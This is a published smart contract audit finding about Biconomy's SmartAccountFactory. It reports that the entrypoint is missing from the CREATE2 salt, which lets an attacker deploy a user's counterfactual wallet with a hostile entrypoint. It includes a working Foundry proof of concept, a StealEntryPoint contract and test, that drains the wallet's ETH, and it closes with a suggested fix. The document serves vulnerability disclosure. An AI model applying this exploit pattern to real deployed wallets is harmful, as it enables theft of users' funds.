[H-03] Attacker can gain control of counterfactual wallet
Submitted byadriro, also found by0x73696d616f,giovannidisiena,Qeew,V_B,0x1f8b,adriro,ey88,wait,Haipls,betweenETHlines,Lirios,hihen,hihen,horsefacts,bin2chen,ast3ros,aviggiano,0xdeadbeef0x,chaduke,Jayus,ladboy233,ladboy233,zaskoh,Kalzak,dragotanqueray,BClabs, andHE1M
A counterfactual wallet can be used by pre-generating its address using theSmartAccountFactory.getAddressForCounterfactualWalletfunction. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.
However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:
https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45
functiondeployCounterFactualWallet(address_owner,address_entryPoint,address_handler,uint_index)publicreturns(addressproxy){bytes32salt=keccak256(abi.encodePacked(_owner,address(uint160(_index))));bytesmemorydeploymentData=abi.encodePacked(type(Proxy).creationCode,uint(uint160(_defaultImpl)));// solhint-disable-next-line no-inline-assemblyassembly{proxy :=create2(0x0,add(0x20,deploymentData),mload(deploymentData),salt)}require(address(proxy) !=address(0),"Create2 call failed");// EOA + Version trackingemitSmartAccountCreated(proxy,_defaultImpl,_owner,VERSION,_index);BaseSmartAccount(proxy).init(_owner,_entryPoint,_handler);isAccountExist[proxy] =true;}
As the entrypoint address doesn’t take any role in the address generation (it isn’t part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.
Impact
After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (usingdelegatecall) using theexecFromEntryPointfunction:
https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492
functionexecFromEntryPoint(addressdest,uintvalue,bytescalldatafunc, Enum.Operationoperation,uint256gasLimit)externalonlyEntryPointreturns(boolsuccess) {success=execute(dest,value,func,operation,gasLimit);require(success,"Userop Failed");}
This means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.
Proof of Concept
In the following test, the attacker deploys the counterfactual wallet using theStealEntryPointcontract as the entrypoint, which is then used to steal any funds present in the wallet.
contractStealEntryPoint{functionsteal(SmartAccountwallet)public{uint256balance=address(wallet).balance;wallet.execFromEntryPoint(msg.sender,// address destbalance,// uint value"",// bytes calldata funcEnum.Operation.Call,// Enum.Operation operationgasleft()// uint256 gasLimit);}}contractAuditTestisTest{bytes32internalconstantACCOUNT_TX_TYPEHASH=0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;uint256bobPrivateKey=0x123;uint256attackerPrivateKey=0x456;addressdeployer;addressbob;addressattacker;addressentrypoint;addresshandler;SmartAccountpublicimplementation;SmartAccountFactorypublicfactory;MockTokenpublictoken;functionsetUp()public{deployer=makeAddr("deployer");bob=vm.addr(bobPrivateKey);attacker=vm.addr(attackerPrivateKey);entrypoint=makeAddr("entrypoint");handler=makeAddr("handler");vm.label(deployer,"deployer");vm.label(bob,"bob");vm.label(attacker,"attacker");vm.startPrank(deployer);implementation=newSmartAccount();factory=newSmartAccountFactory(address(implementation));token=newMockToken();vm.stopPrank();}functiontest_SmartAccountFactory_StealCounterfactualWallet()public{uint256index=0;addresscounterfactualWallet=factory.getAddressForCounterfactualWallet(bob,index);// Simulate Bob sends 1 ETH to the walletuint256amount=1ether;vm.deal(counterfactualWallet,amount);// Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)vm.startPrank(attacker);StealEntryPointstealer=newStealEntryPoint();addressproxy=factory.deployCounterFactualWallet(bob,address(stealer),handler,index);SmartAccountwallet=SmartAccount(payable(proxy));// address is the sameassertEq(address(wallet),counterfactualWallet);// trigger attackstealer.steal(wallet);vm.stopPrank();// Attacker has stolen the fundsassertEq(address(wallet).balance,0);assertEq(attacker.balance,amount);}}
Recommended Mitigation Steps
This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.
gzeon (judge) commented:
#278also described a way to make the user tx not revert by self destructing with another call. i.e.Frontrun deploySet approval and selfdestructUser deploy, no revert
livingrockrises (Biconomy) confirmed